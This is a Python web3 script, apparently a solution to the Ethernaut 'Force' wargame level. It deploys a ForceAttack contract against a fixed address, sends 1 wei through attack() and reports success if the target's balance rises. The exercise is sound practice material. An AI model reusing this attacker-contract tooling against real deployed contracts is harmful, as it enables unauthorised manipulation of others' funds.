from web3 import Web3
from solcx import compile_source
from dotenv import dotenv_values

# 풀이
# 1. 

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']


CONTRACT_ADDRESS = '0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL07_ADDRESS']
USER_PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(USER_PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = []

with open("./contract/ForceAttack.sol", "r") as f:
    ATTACKER_SRC_DATA = f.read()

COMPILED_SOL = compile_source(ATTACKER_SRC_DATA, output_values=['abi', 'bin'])

contract_id, contract_interface = COMPILED_SOL.popitem()

ATTACKER_BYTECODE = contract_interface['bin']
ATTACKER_ABI = contract_interface['abi']

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
attacker = web3.eth.contract(abi=ATTACKER_ABI, bytecode=ATTACKER_BYTECODE)

print("---- BEFORE TRANSACTION ----")

BEFORE_BALANCE = web3.eth.get_balance(CONTRACT_ADDRESS)

print(f"Contract's current balance : {BEFORE_BALANCE}")

# Attacker 컨트랙트 사전 배포
tx_hash = attacker.constructor(CONTRACT_ADDRESS).transact()

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

ATTACKER_ADDRESS = receipt.contractAddress

# Attacker 컨트랙트 주소 연결
attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)

# 컨트랙트를 통한 송금 실시
data = {
    'value': 1,
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = attacker.functions.attack().build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

print("---- AFTER TRANSACTION ----")

AFTER_BALANCE = web3.eth.get_balance(CONTRACT_ADDRESS)

print(f"Contract's current balance : {AFTER_BALANCE}")

if AFTER_BALANCE > 0:
  print("Attack Success!")
else:
  print("Attack Failed...")